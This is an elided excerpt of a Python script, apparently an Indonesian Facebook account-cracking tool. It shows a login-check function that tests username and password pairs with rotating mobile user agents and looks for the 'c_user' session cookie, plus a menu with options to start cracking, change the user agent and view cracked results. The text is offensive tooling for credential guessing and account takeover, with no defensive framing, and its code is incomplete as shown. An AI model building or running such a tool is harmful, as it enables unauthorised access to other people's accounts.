...
def mengecek(user, pw):
	...
	ua = random.choice(["Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
	ses = requests.Session()
	...
	if "c_user" in ses.cookies:
		...
		#nomer = 0
		#for app in apk:
			#print("  %s%s. %s%s, %s"%(P,str(nomer+1),H,app[0][0],app[0][1]))
...
def menu():
    ...
    print ('%s•%s 07 %sStart crack'%(U,H,O))
    print ('%s•%s 08 %sGanti user agent'%(U,P,O))
    print ('%s•%s 09 %sCek hasil crack'%(U,P,O))
    print ('%s•%s 10 %sCek opsi akun'%(U,P,O))
    #print ('%s•%s 11 %sInfo script'%(U,P,O))
